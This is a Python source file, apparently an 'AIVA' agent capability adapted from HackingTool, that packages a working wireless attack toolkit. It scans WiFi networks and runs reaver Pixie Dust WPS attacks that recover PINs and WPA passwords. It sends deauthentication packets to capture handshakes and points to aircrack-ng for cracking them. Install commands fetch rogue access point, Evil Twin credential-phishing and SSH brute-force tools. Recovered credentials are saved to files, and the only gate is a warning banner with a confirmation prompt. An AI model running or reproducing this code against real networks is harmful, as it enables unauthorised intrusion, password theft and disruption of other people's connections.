#!/usr/bin/env python3
"""
AIVA Wireless Attack Tools - 完整重建版本

此文件基於 HackingTool 的 wireless_attack_tools.py，
完整整合到 AIVA 能力系統架構中。

功能包括：
- WiFi 滲透測試工具
- WPS 攻擊工具
- 藍牙攻擊工具
- 無線網絡掃描和監控

⚠️  警告：僅用於授權的安全測試！
"""

import asyncio
import json
import logging
import os
import subprocess
import time
from dataclasses import dataclass, asdict, field
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any, Union

from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.table import Table
from rich.theme import Theme
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.text import Text

# AIVA Core Imports
from ...core.base_capability import BaseCapability
from ...aiva_common.schemas import APIResponse, CapabilityType
from ...core.registry import CapabilityRegistry

# ===== 全局配置 =====
_theme = Theme({"purple": "#7B61FF", "warning": "yellow", "error": "red", "success": "green"})
console = Console(theme=_theme)
logger = logging.getLogger(__name__)

# 常量
WARNING_MSG = "[warning]⚠️  僅用於授權測試！未經授權的網絡攻擊是違法的。[/warning]"
PROGRESS_DESC = "[progress.description]{task.description}"
DATA_DIR = Path("data/wireless_attacks")
DATA_DIR.mkdir(parents=True, exist_ok=True)


# ===== 數據模型 =====

@dataclass
class AttackResult:
    """攻擊結果數據結構"""
    attack_type: str
    target: str
    start_time: str
    end_time: str
    duration: float
    success: bool
    captured_data: Optional[Dict[str, Any]] = None
    error_details: Optional[str] = None
    tool_used: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        """轉換為字典"""
        return asdict(self)

    def save_to_file(self, filepath: Optional[Path] = None):
        """保存結果到文件"""
        if filepath is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = DATA_DIR / f"attack_{self.attack_type}_{timestamp}.json"
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(self.to_dict(), f, indent=2, ensure_ascii=False)
        
        logger.info(f"Attack result saved to {filepath}")


@dataclass
class WifiNetwork:
    """WiFi 網絡信息"""
    bssid: str
    essid: str
    channel: int = 0
    encryption: str = "Unknown"
    signal_strength: int = 0
    frequency: str = ""
    hidden: bool = False
    wps_enabled: bool = False
    clients: List[str] = field(default_factory=list)

    def __str__(self) -> str:
        return f"{self.essid} ({self.bssid}) - Ch:{self.channel} - {self.encryption}"


@dataclass
class BluetoothDevice:
    """藍牙設備信息"""
    address: str
    name: str = "Unknown"
    device_class: str = ""
    signal_strength: int = 0
    services: List[str] = field(default_factory=list)

    def __str__(self) -> str:
        return f"{self.name} ({self.address})"


# ===== 工具基礎類 =====

class WirelessTool:
    """無線工具基礎類"""
    
    TITLE: str = ""
    DESCRIPTION: str = ""
    INSTALL_COMMANDS: List[str] = []
    RUN_COMMANDS: List[str] = []
    PROJECT_URL: str = ""
    REQUIRES_ROOT: bool = True
    
    def __init__(self):
        self.console = console
        self.logger = logger
    
    def is_installed(self) -> bool:
        """檢查工具是否已安裝"""
        if not self.RUN_COMMANDS:
            return False
        
        # 提取主命令
        main_cmd = self.RUN_COMMANDS[0].split()[0]
        if main_cmd.startswith("cd "):
            # 處理 "cd dir && command" 格式
            parts = self.RUN_COMMANDS[0].split("&&")
            if len(parts) > 1:
                main_cmd = parts[1].strip().split()[0]
        
        try:
            subprocess.run(
                ["which", main_cmd],
                capture_output=True,
                check=True,
                timeout=5
            )
            return True
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError):
            return False
    
    async def install(self) -> bool:
        """安裝工具"""
        if self.is_installed():
            self.console.print(f"[success]✅ {self.TITLE} 已安裝[/success]")
            return True
        
        self.console.print(Panel.fit(
            f"[purple]正在安裝 {self.TITLE}...[/purple]\n\n{self.DESCRIPTION}",
            title="安裝工具",
            border_style="purple"
        ))
        
        for cmd in self.INSTALL_COMMANDS:
            self.console.print(f"[purple]執行:[/purple] {cmd}")
            try:
                process = await asyncio.create_subprocess_shell(
                    cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                stdout, stderr = await process.communicate()
                
                if process.returncode != 0:
                    error_msg = stderr.decode() if stderr else "Unknown error"
                    self.console.print(f"[error]❌ 安裝失敗:[/error] {error_msg}")
                    return False
                    
            except Exception as e:
                self.console.print(f"[error]❌ 安裝錯誤:[/error] {str(e)}")
                return False
        
        self.console.print(f"[success]✅ {self.TITLE} 安裝成功[/success]")
        return True
    
    async def run(self) -> AttackResult:
        """運行工具（子類需重寫）"""
        raise NotImplementedError("Subclasses must implement run()")
    
    def check_root(self) -> bool:
        """檢查 root 權限"""
        if self.REQUIRES_ROOT and os.geteuid() != 0:
            self.console.print("[error]❌ 此工具需要 root 權限！請使用 sudo 運行。[/error]")
            return False
        return True
    
    def show_info(self):
        """顯示工具信息"""
        table = Table(title=self.TITLE, show_header=False, border_style="purple")
        table.add_column("Property", style="bold cyan")
        table.add_column("Value", style="white")
        
        table.add_row("描述", self.DESCRIPTION)
        table.add_row("需要 Root", "是" if self.REQUIRES_ROOT else "否")
        table.add_row("已安裝", "✅" if self.is_installed() else "❌")
        table.add_row("項目地址", self.PROJECT_URL)
        
        self.console.print(Panel(table, border_style="purple"))


# ===== 具體工具類 =====

class WIFIPumpkin(WirelessTool):
    TITLE = "WiFi-Pumpkin"
    DESCRIPTION = (
        "The WiFi-Pumpkin is a rogue AP framework to easily create "
        "these fake networks all while forwarding legitimate traffic "
        "to and from the unsuspecting target."
    )
    INSTALL_COMMANDS = [
        "sudo apt install libssl-dev libffi-dev build-essential -y",
        "sudo git clone https://github.com/P0cL4bs/wifipumpkin3.git /opt/wifipumpkin3",
        "sudo chmod -R 755 /opt/wifipumpkin3",
        "sudo apt install python3-pyqt5 -y",
        "cd /opt/wifipumpkin3 && sudo python3 setup.py install",
    ]
    RUN_COMMANDS = ["sudo wifipumpkin3"]
    PROJECT_URL = "https://github.com/P0cL4bs/wifipumpkin3"


class Pixiewps(WirelessTool):
    TITLE = "pixiewps"
    DESCRIPTION = (
        "Pixiewps is a tool written in C used to bruteforce offline "
        "the WPS PIN exploiting the low or non-existing entropy of "
        "some Access Points (Pixie Dust Attack)"
    )
    INSTALL_COMMANDS = [
        "sudo git clone https://github.com/wiire/pixiewps.git /opt/pixiewps",
        "sudo apt-get -y install build-essential",
        "cd /opt/pixiewps && sudo make",
        "cd /opt/pixiewps && sudo make install",
    ]
    RUN_COMMANDS = ["pixiewps -h"]
    PROJECT_URL = "https://github.com/wiire/pixiewps"


class BluePot(WirelessTool):
    TITLE = "BluePot"
    DESCRIPTION = (
        "Bluetooth Honeypot GUI Framework. "
        "Requires at least 1 bluetooth receiver. "
        "Must install libbluetooth-dev on Ubuntu."
    )
    INSTALL_COMMANDS = [
        "sudo apt-get install -y libbluetooth-dev bluez",
        "sudo wget -P /opt https://raw.githubusercontent.com/andrewmichaelsmith/bluepot/master/bin/bluepot-0.2.tar.gz",
        "cd /opt && sudo tar xfz bluepot-0.2.tar.gz && sudo rm bluepot-0.2.tar.gz",
    ]
    RUN_COMMANDS = ["cd /opt/bluepot && sudo java -jar bluepot.jar"]
    PROJECT_URL = "https://github.com/andrewmichaelsmith/bluepot"


class Fluxion(WirelessTool):
    TITLE = "Fluxion"
    DESCRIPTION = "Fluxion is a remake of linset by vk496 with enhanced functionality."
    INSTALL_COMMANDS = [
        "sudo git clone https://github.com/FluxionNetwork/fluxion.git /opt/fluxion",
        "cd /opt/fluxion && sudo chmod +x fluxion.sh",
    ]
    RUN_COMMANDS = ["cd /opt/fluxion && sudo bash fluxion.sh -i"]
    PROJECT_URL = "https://github.com/FluxionNetwork/fluxion"


class Wifiphisher(WirelessTool):
    TITLE = "Wifiphisher"
    DESCRIPTION = (
        "Wifiphisher is a rogue Access Point framework for red team "
        "engagements or Wi-Fi security testing. Performs targeted "
        "Wi-Fi association attacks and victim-customized web phishing."
    )
    INSTALL_COMMANDS = [
        "sudo git clone https://github.com/wifiphisher/wifiphisher.git /opt/wifiphisher",
        "cd /opt/wifiphisher && sudo python3 setup.py install",
    ]
    RUN_COMMANDS = ["cd /opt/wifiphisher && sudo wifiphisher"]
    PROJECT_URL = "https://github.com/wifiphisher/wifiphisher"


class Wifite(WirelessTool):
    TITLE = "Wifite"
    DESCRIPTION = "Wifite is an automated wireless attack tool"
    INSTALL_COMMANDS = [
        "sudo git clone https://github.com/derv82/wifite2.git /opt/wifite2",
        "cd /opt/wifite2 && sudo python3 setup.py install",
    ]
    RUN_COMMANDS = ["cd /opt/wifite2 && sudo wifite"]
    PROJECT_URL = "https://github.com/derv82/wifite2"


class EvilTwin(WirelessTool):
    TITLE = "EvilTwin"
    DESCRIPTION = (
        "Fakeap is a script to perform Evil Twin Attack, "
        "by getting credentials using a Fake page and Fake Access Point"
    )
    INSTALL_COMMANDS = ["sudo git clone https://github.com/Z4nzu/fakeap.git /opt/fakeap"]
    RUN_COMMANDS = ["cd /opt/fakeap && sudo bash fakeap.sh"]
    PROJECT_URL = "https://github.com/Z4nzu/fakeap"


class Fastssh(WirelessTool):
    TITLE = "Fastssh"
    DESCRIPTION = (
        "Fastssh is an Shell Script to perform multi-threaded scan "
        "and brute force attack against SSH protocol using the "
        "most commonly credentials."
    )
    INSTALL_COMMANDS = [
        "sudo git clone https://github.com/Z4nzu/fastssh.git /opt/fastssh",
        "cd /opt/fastssh && sudo chmod +x fastssh.sh",
        "sudo apt-get install -y sshpass netcat",
    ]
    RUN_COMMANDS = ["cd /opt/fastssh && sudo bash fastssh.sh --scan"]
    PROJECT_URL = "https://github.com/Z4nzu/fastssh"


class Howmanypeople(WirelessTool):
    TITLE = "Howmanypeople"
    DESCRIPTION = (
        "Count the number of people around you by monitoring wifi signals. "
        "WIFI ADAPTER REQUIRED. May be illegal in some jurisdictions."
    )
    INSTALL_COMMANDS = [
        "sudo apt-get install tshark -y",
        "sudo python3 -m pip install howmanypeoplearearound",
    ]
    RUN_COMMANDS = ["howmanypeoplearearound"]
    PROJECT_URL = "https://github.com/schollz/howmanypeoplearearound"
    REQUIRES_ROOT = False


# ===== 掃描和攻擊管理類 =====

class WifiScanner:
    """WiFi 網絡掃描器"""
    
    def __init__(self):
        self.console = console
        self.logger = logger
        self.networks: List[WifiNetwork] = []
        self.interface: Optional[str] = None
        self.monitor_interface: Optional[str] = None
    
    async def check_interface(self) -> Optional[str]:
        """檢查無線網卡"""
        try:
            process = await asyncio.create_subprocess_shell(
                "iwconfig 2>&1 | grep -o '^[a-z0-9]*' | head -1",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await process.communicate()
            interface = stdout.decode().strip()
            
            if interface:
                self.interface = interface
                self.console.print(f"[success]✅ 找到無線網卡: {interface}[/success]")
                return interface
            else:
                self.console.print("[error]❌ 未找到無線網卡[/error]")
                return None
                
        except Exception as e:
            self.logger.error(f"Error checking interface: {e}")
            return None
    
    async def enable_monitor_mode(self) -> bool:
        """啟用監控模式"""
        if not self.interface:
            await self.check_interface()
        
        if not self.interface:
            return False
        
        self.console.print(f"[purple]正在啟用監控模式...[/purple]")
        
        try:
            # 停止可能干擾的進程
            await asyncio.create_subprocess_shell(
                "sudo airmon-ng check kill",
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL
            )
            
            # 啟用監控模式
            process = await asyncio.create_subprocess_shell(
                f"sudo airmon-ng start {self.interface}",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            await process.communicate()
            
            # 獲取監控接口名稱
            self.monitor_interface = f"{self.interface}mon"
            self.console.print(f"[success]✅ 監控模式已啟用: {self.monitor_interface}[/success]")
            return True
            
        except Exception as e:
            self.logger.error(f"Error enabling monitor mode: {e}")
            self.console.print(f"[error]❌ 啟用監控模式失敗: {e}[/error]")
            return False
    
    async def disable_monitor_mode(self) -> bool:
        """停用監控模式"""
        if not self.monitor_interface:
            return True
        
        self.console.print(f"[purple]正在停用監控模式...[/purple]")
        
        try:
            process = await asyncio.create_subprocess_shell(
                f"sudo airmon-ng stop {self.monitor_interface}",
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL
            )
            await process.communicate()
            
            # 重啟網絡管理器
            await asyncio.create_subprocess_shell(
                "sudo service network-manager restart",
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL
            )
            
            self.console.print("[success]✅ 監控模式已停用[/success]")
            self.monitor_interface = None
            return True
            
        except Exception as e:
            self.logger.error(f"Error disabling monitor mode: {e}")
            return False
    
    async def scan_networks(self, duration: int = 30) -> List[WifiNetwork]:
        """掃描 WiFi 網絡"""
        if not self.monitor_interface:
            if not await self.enable_monitor_mode():
                return []
        
        self.console.print(f"[purple]正在掃描 WiFi 網絡... ({duration}秒)[/purple]")
        self.networks.clear()
        
        # 使用 airodump-ng 掃描
        csv_file = DATA_DIR / f"scan_{int(time.time())}"
        
        try:
            process = await asyncio.create_subprocess_shell(
                f"sudo timeout {duration} airodump-ng -w {csv_file} --output-format csv {self.monitor_interface}",
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL
            )
            await process.wait()
            
            # 解析結果
            csv_path = Path(f"{csv_file}-01.csv")
            if csv_path.exists():
                self.networks = self._parse_airodump_csv(csv_path)
                csv_path.unlink()  # 刪除臨時文件
            
            self.console.print(f"[success]✅ 找到 {len(self.networks)} 個網絡[/success]")
            return self.networks
            
        except Exception as e:
            self.logger.error(f"Error scanning networks: {e}")
            self.console.print(f"[error]❌ 掃描失敗: {e}[/error]")
            return []
    
    def _parse_airodump_csv(self, csv_path: Path) -> List[WifiNetwork]:
        """解析 airodump-ng CSV 輸出"""
        networks = []
        
        try:
            with open(csv_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            # 找到網絡數據部分
            in_networks = False
            for line in lines:
                if line.strip().startswith("BSSID"):
                    in_networks = True
                    continue
                
                if in_networks and line.strip() and not line.strip().startswith("Station"):
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 14:
                        try:
                            network = WifiNetwork(
                                bssid=parts[0],
                                essid=parts[13] or "<Hidden>",
                                channel=int(parts[3]) if parts[3].isdigit() else 0,
                                encryption=parts[5],
                                signal_strength=int(parts[8]) if parts[8].lstrip('-').isdigit() else 0,
                                frequency=parts[4],
                                hidden=(parts[13] == ''),
                            )
                            networks.append(network)
                        except (ValueError, IndexError) as e:
                            self.logger.debug(f"Skipping invalid line: {e}")
                            continue
                
                if line.strip().startswith("Station"):
                    break
            
        except Exception as e:
            self.logger.error(f"Error parsing CSV: {e}")
        
        return networks
    
    def show_networks(self):
        """顯示掃描到的網絡"""
        if not self.networks:
            self.console.print("[warning]⚠️  沒有掃描到網絡[/warning]")
            return
        
        table = Table(title="WiFi Networks", show_lines=True, expand=True)
        table.add_column("#", justify="center", style="bold yellow")
        table.add_column("ESSID", style="cyan")
        table.add_column("BSSID", style="purple")
        table.add_column("Channel", justify="center", style="green")
        table.add_column("Encryption", style="magenta")
        table.add_column("Signal", justify="center", style="white")
        
        for idx, network in enumerate(self.networks, 1):
            table.add_row(
                str(idx),
                network.essid,
                network.bssid,
                str(network.channel),
                network.encryption,
                f"{network.signal_strength} dBm"
            )
        
        self.console.print(Panel(table, border_style="purple"))


class WPSAttack:
    """WPS 攻擊管理"""
    
    def __init__(self, scanner: WifiScanner):
        self.scanner = scanner
        self.console = console
        self.logger = logger
    
    async def check_wps_enabled(self, network: WifiNetwork) -> bool:
        """檢查 WPS 是否啟用"""
        try:
            process = await asyncio.create_subprocess_shell(
                f"sudo wash -i {self.scanner.monitor_interface} -C -s 2>&1 | grep {network.bssid}",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await process.communicate()
            
            result = stdout.decode()
            network.wps_enabled = network.bssid in result
            return network.wps_enabled
            
        except Exception as e:
            self.logger.error(f"Error checking WPS: {e}")
            return False
    
    async def pixie_dust_attack(self, network: WifiNetwork) -> AttackResult:
        """執行 Pixie Dust 攻擊"""
        start_time = datetime.now()
        
        self.console.print(Panel.fit(
            f"[purple]正在對 {network.essid} 執行 Pixie Dust 攻擊...[/purple]\n"
            f"BSSID: {network.bssid}\n"
            f"Channel: {network.channel}",
            title="WPS Attack",
            border_style="purple"
        ))
        
        try:
            # 使用 reaver + pixiewps
            process = await asyncio.create_subprocess_shell(
                f"sudo reaver -i {self.scanner.monitor_interface} "
                f"-b {network.bssid} -c {network.channel} -vvv -K 1 -f -N",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=300  # 5 分鐘超時
            )
            
            output = stdout.decode() + stderr.decode()
            
            # 解析結果
            pin = None
            password = None
            
            if "WPS PIN:" in output:
                for line in output.split('\n'):
                    if "WPS PIN:" in line:
                        pin = line.split("WPS PIN:")[1].strip().split()[0]
                    if "WPA PSK:" in line:
                        password = line.split("WPA PSK:")[1].strip().split()[0]
            
            end_time = datetime.now()
            duration = (end_time - start_time).total_seconds()
            
            result = AttackResult(
                attack_type="WPS_Pixie_Dust",
                target=f"{network.essid} ({network.bssid})",
                start_time=start_time.isoformat(),
                end_time=end_time.isoformat(),
                duration=duration,
                success=(pin is not None),
                captured_data={"pin": pin, "password": password} if pin else None,
                tool_used="reaver + pixiewps"
            )
            
            if result.success:
                self.console.print(Panel.fit(
                    f"[success]✅ 攻擊成功！[/success]\n\n"
                    f"WPS PIN: {pin}\n"
                    f"Password: {password or 'N/A'}",
                    title="Success",
                    border_style="green"
                ))
            else:
                self.console.print("[warning]⚠️  攻擊失敗或超時[/warning]")
            
            result.save_to_file()
            return result
            
        except asyncio.TimeoutError:
            end_time = datetime.now()
            duration = (end_time - start_time).total_seconds()
            
            result = AttackResult(
                attack_type="WPS_Pixie_Dust",
                target=f"{network.essid} ({network.bssid})",
                start_time=start_time.isoformat(),
                end_time=end_time.isoformat(),
                duration=duration,
                success=False,
                error_details="Timeout (5 minutes)",
                tool_used="reaver + pixiewps"
            )
            
            self.console.print("[error]❌ 攻擊超時（5分鐘）[/error]")
            return result
            
        except Exception as e:
            end_time = datetime.now()
            duration = (end_time - start_time).total_seconds()
            
            result = AttackResult(
                attack_type="WPS_Pixie_Dust",
                target=f"{network.essid} ({network.bssid})",
                start_time=start_time.isoformat(),
                end_time=end_time.isoformat(),
                duration=duration,
                success=False,
                error_details=str(e),
                tool_used="reaver + pixiewps"
            )
            
            self.logger.error(f"WPS attack error: {e}")
            self.console.print(f"[error]❌ 攻擊錯誤: {e}[/error]")
            return result


class HandshakeCapture:
    """握手包捕獲"""
    
    def __init__(self, scanner: WifiScanner):
        self.scanner = scanner
        self.console = console
        self.logger = logger
    
    async def capture_handshake(
        self, 
        network: WifiNetwork, 
        timeout: int = 120
    ) -> AttackResult:
        """捕獲 WPA/WPA2 握手包"""
        start_time = datetime.now()
        
        self.console.print(Panel.fit(
            f"[purple]正在捕獲 {network.essid} 的握手包...[/purple]\n"
            f"BSSID: {network.bssid}\n"
            f"Channel: {network.channel}\n"
            f"Timeout: {timeout}秒",
            title="Handshake Capture",
            border_style="purple"
        ))
        
        capture_file = DATA_DIR / f"handshake_{network.bssid.replace(':', '')}_{int(time.time())}"
        
        try:
            # 啟動 airodump-ng 捕獲
            airodump_proc = await asyncio.create_subprocess_shell(
                f"sudo airodump-ng -c {network.channel} "
                f"--bssid {network.bssid} -w {capture_file} "
                f"{self.scanner.monitor_interface}",
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL
            )
            
            # 等待一會兒
            await asyncio.sleep(5)
            
            # 發送 deauth 封包（強制客戶端重新連接）
            self.console.print("[purple]正在發送 deauth 封包...[/purple]")
            deauth_proc = await asyncio.create_subprocess_shell(
                f"sudo aireplay-ng -0 5 -a {network.bssid} {self.scanner.monitor_interface}",
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL
            )
            await deauth_proc.wait()
            
            # 等待捕獲握手包
            self.console.print("[purple]等待握手包...[/purple]")
            
            start_wait = time.time()
            captured = False
            
            while time.time() - start_wait < timeout:
                # 檢查是否捕獲到握手包
                cap_file = Path(f"{capture_file}-01.cap")
                if cap_file.exists():
                    # 使用 aircrack-ng 檢查握手包
                    check_proc = await asyncio.create_subprocess_shell(
                        f"sudo aircrack-ng {cap_file} 2>&1 | grep handshake",
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE
                    )
                    stdout, _ = await check_proc.communicate()
                    
                    if b"handshake" in stdout.lower():
                        captured = True
                        break
                
                await asyncio.sleep(2)
            
            # 停止 airodump
            airodump_proc.terminate()
            await airodump_proc.wait()
            
            end_time = datetime.now()
            duration = (end_time - start_time).total_seconds()
            
            result = AttackResult(
                attack_type="Handshake_Capture",
                target=f"{network.essid} ({network.bssid})",
                start_time=start_time.isoformat(),
                end_time=end_time.isoformat(),
                duration=duration,
                success=captured,
                captured_data={"capture_file": str(capture_file) + "-01.cap"} if captured else None,
                tool_used="airodump-ng + aireplay-ng"
            )
            
            if captured:
                self.console.print(Panel.fit(
                    f"[success]✅ 握手包捕獲成功！[/success]\n\n"
                    f"文件: {capture_file}-01.cap\n\n"
                    f"下一步: 使用 aircrack-ng 破解\n"
                    f"sudo aircrack-ng -w wordlist.txt {capture_file}-01.cap",
                    title="Success",
                    border_style="green"
                ))
            else:
                self.console.print("[warning]⚠️  未捕獲到握手包[/warning]")
            
            result.save_to_file()
            return result
            
        except Exception as e:
            end_time = datetime.now()
            duration = (end_time - start_time).total_seconds()
            
            result = AttackResult(
                attack_type="Handshake_Capture",
                target=f"{network.essid} ({network.bssid})",
                start_time=start_time.isoformat(),
                end_time=end_time.isoformat(),
                duration=duration,
                success=False,
                error_details=str(e),
                tool_used="airodump-ng + aireplay-ng"
            )
            
            self.logger.error(f"Handshake capture error: {e}")
            self.console.print(f"[error]❌ 捕獲錯誤: {e}[/error]")
            return result


class BluetoothScanner:
    """藍牙設備掃描"""
    
    def __init__(self):
        self.console = console
        self.logger = logger
        self.devices: List[BluetoothDevice] = []
    
    async def scan_bluetooth_devices(self, duration: int = 30) -> List[BluetoothDevice]:
        """掃描藍牙設備"""
        self.console.print(f"[purple]正在掃描藍牙設備... ({duration}秒)[/purple]")
        self.devices.clear()
        
        try:
            # 使用 hcitool 掃描
            process = await asyncio.create_subprocess_shell(
                f"sudo timeout {duration} hcitool scan",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, _ = await process.communicate()
            output = stdout.decode()
            
            # 解析結果
            for line in output.split('\n'):
                parts = line.strip().split(None, 1)
                if len(parts) == 2 and ':' in parts[0]:
                    address, name = parts
                    device = BluetoothDevice(address=address, name=name)
                    self.devices.append(device)
            
            self.console.print(f"[success]✅ 找到 {len(self.devices)} 個藍牙設備[/success]")
            return self.devices
            
        except Exception as e:
            self.logger.error(f"Bluetooth scan error: {e}")
            self.console.print(f"[error]❌ 掃描失敗: {e}[/error]")
            return []
    
    def show_bluetooth_devices(self):
        """顯示藍牙設備"""
        if not self.devices:
            self.console.print("[warning]⚠️  沒有找到藍牙設備[/warning]")
            return
        
        table = Table(title="Bluetooth Devices", show_lines=True)
        table.add_column("#", justify="center", style="bold yellow")
        table.add_column("Address", style="cyan")
        table.add_column("Name", style="purple")
        
        for idx, device in enumerate(self.devices, 1):
            table.add_row(str(idx), device.address, device.name)
        
        self.console.print(Panel(table, border_style="purple"))


# ===== 管理器類 =====

class WirelessManager:
    """無線攻擊管理器"""
    
    def __init__(self):
        self.console = console
        self.logger = logger
        
        # 初始化工具
        self.tools = [
            WIFIPumpkin(),
            Pixiewps(),
            BluePot(),
            Fluxion(),
            Wifiphisher(),
            Wifite(),
            EvilTwin(),
            Fastssh(),
            Howmanypeople(),
        ]
        
        # 初始化掃描器和攻擊模組
        self.wifi_scanner = WifiScanner()
        self.wps_attack = WPSAttack(self.wifi_scanner)
        self.handshake_capture = HandshakeCapture(self.wifi_scanner)
        self.bluetooth_scanner = BluetoothScanner()
    
    async def interactive_menu(self):
        """交互式菜單"""
        console.print(Panel.fit(
            "[bold purple]AIVA Wireless Attack Tools[/bold purple]\n\n"
            + WARNING_MSG,
            title="歡迎",
            border_style="purple"
        ))
        
        while True:
            console.print("\n")
            table = Table(title="[bold cyan]Main Menu[/bold cyan]", show_lines=True)
            table.add_column("選項", justify="center", style="bold yellow", width=10)
            table.add_column("功能", justify="left", style="white")
            
            table.add_row("1", "掃描 WiFi 網絡")
            table.add_row("2", "WPS Pixie Dust 攻擊")
            table.add_row("3", "捕獲握手包")
            table.add_row("4", "掃描藍牙設備")
            table.add_row("5", "工具管理（安裝/運行）")
            table.add_row("6", "查看攻擊歷史")
            table.add_row("0", "[red]退出[/red]")
            
            console.print(table)
            
            try:
                choice = Prompt.ask("[bold cyan]請選擇[/bold cyan]", default="0")
                
                if choice == "1":
                    await self._menu_scan_wifi()
                elif choice == "2":
                    await self._menu_wps_attack()
                elif choice == "3":
                    await self._menu_handshake()
                elif choice == "4":
                    await self._menu_bluetooth()
                elif choice == "5":
                    await self._menu_tools()
                elif choice == "6":
                    self._menu_history()
                elif choice == "0":
                    console.print("[purple]再見！[/purple]")
                    break
                else:
                    console.print("[error]❌ 無效選項[/error]")
                    
            except KeyboardInterrupt:
                console.print("\n[purple]已取消[/purple]")
                break
            except Exception as e:
                console.print(f"[error]❌ 錯誤: {e}[/error]")
    
    async def _menu_scan_wifi(self):
        """WiFi 掃描菜單"""
        duration = IntPrompt.ask("[cyan]掃描時長（秒）[/cyan]", default=30)
        await self.wifi_scanner.scan_networks(duration)
        self.wifi_scanner.show_networks()
    
    async def _menu_wps_attack(self):
        """WPS 攻擊菜單"""
        if not self.wifi_scanner.networks:
            console.print("[warning]⚠️  請先掃描網絡[/warning]")
            return
        
        self.wifi_scanner.show_networks()
        
        idx = IntPrompt.ask("[cyan]選擇目標網絡（編號）[/cyan]")
        if 1 <= idx <= len(self.wifi_scanner.networks):
            target = self.wifi_scanner.networks[idx - 1]
            
            if Confirm.ask(f"[yellow]確定攻擊 {target.essid}?[/yellow]"):
                await self.wps_attack.pixie_dust_attack(target)
        else:
            console.print("[error]❌ 無效編號[/error]")
    
    async def _menu_handshake(self):
        """握手包捕獲菜單"""
        if not self.wifi_scanner.networks:
            console.print("[warning]⚠️  請先掃描網絡[/warning]")
            return
        
        self.wifi_scanner.show_networks()
        
        idx = IntPrompt.ask("[cyan]選擇目標網絡（編號）[/cyan]")
        if 1 <= idx <= len(self.wifi_scanner.networks):
            target = self.wifi_scanner.networks[idx - 1]
            timeout = IntPrompt.ask("[cyan]超時時間（秒）[/cyan]", default=120)
            
            if Confirm.ask(f"[yellow]確定捕獲 {target.essid} 的握手包?[/yellow]"):
                await self.handshake_capture.capture_handshake(target, timeout)
        else:
            console.print("[error]❌ 無效編號[/error]")
    
    async def _menu_bluetooth(self):
        """藍牙掃描菜單"""
        duration = IntPrompt.ask("[cyan]掃描時長（秒）[/cyan]", default=30)
        await self.bluetooth_scanner.scan_bluetooth_devices(duration)
        self.bluetooth_scanner.show_bluetooth_devices()
    
    async def _menu_tools(self):
        """工具管理菜單"""
        console.print("\n")
        table = Table(title="[bold cyan]Available Tools[/bold cyan]", show_lines=True)
        table.add_column("#", justify="center", style="bold yellow")
        table.add_column("工具", style="cyan")
        table.add_column("已安裝", justify="center", style="white")
        table.add_column("描述", style="white")
        
        for idx, tool in enumerate(self.tools, 1):
            installed = "✅" if tool.is_installed() else "❌"
            desc = tool.DESCRIPTION[:50] + "..." if len(tool.DESCRIPTION) > 50 else tool.DESCRIPTION
            table.add_row(str(idx), tool.TITLE, installed, desc)
        
        table.add_row("[red]0[/red]", "[red]返回[/red]", "", "")
        console.print(table)
        
        try:
            choice = IntPrompt.ask("[cyan]選擇工具[/cyan]", default=0)
            
            if choice == 0:
                return
            
            if 1 <= choice <= len(self.tools):
                tool = self.tools[choice - 1]
                tool.show_info()
                
                if not tool.is_installed():
                    if Confirm.ask("[yellow]是否安裝此工具?[/yellow]"):
                        await tool.install()
                else:
                    if Confirm.ask("[yellow]是否運行此工具?[/yellow]"):
                        console.print("[purple]請手動運行工具命令...[/purple]")
                        console.print(f"[cyan]{tool.RUN_COMMANDS[0]}[/cyan]")
            else:
                console.print("[error]❌ 無效選項[/error]")
                
        except Exception as e:
            console.print(f"[error]❌ 錯誤: {e}[/error]")
    
    def _menu_history(self):
        """查看攻擊歷史"""
        json_files = list(DATA_DIR.glob("attack_*.json"))
        
        if not json_files:
            console.print("[warning]⚠️  沒有攻擊歷史[/warning]")
            return
        
        table = Table(title="Attack History", show_lines=True)
        table.add_column("#", justify="center", style="bold yellow")
        table.add_column("類型", style="cyan")
        table.add_column("目標", style="purple")
        table.add_column("時間", style="white")
        table.add_column("結果", justify="center", style="white")
        
        for idx, filepath in enumerate(sorted(json_files, reverse=True)[:20], 1):
            try:
                with open(filepath, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                
                result_icon = "✅" if data.get("success") else "❌"
                table.add_row(
                    str(idx),
                    data.get("attack_type", "Unknown"),
                    data.get("target", "Unknown"),
                    data.get("start_time", "Unknown"),
                    result_icon
                )
            except Exception as e:
                logger.error(f"Error reading {filepath}: {e}")
        
        console.print(Panel(table, border_style="purple"))


# ===== AIVA 能力類 =====

class WirelessCapability(BaseCapability):
    """
    無線攻擊能力
    
    提供 WiFi、WPS、藍牙等無線攻擊功能
    """
    
    def __init__(self):
        super().__init__(
            name="wireless_attack_tools",
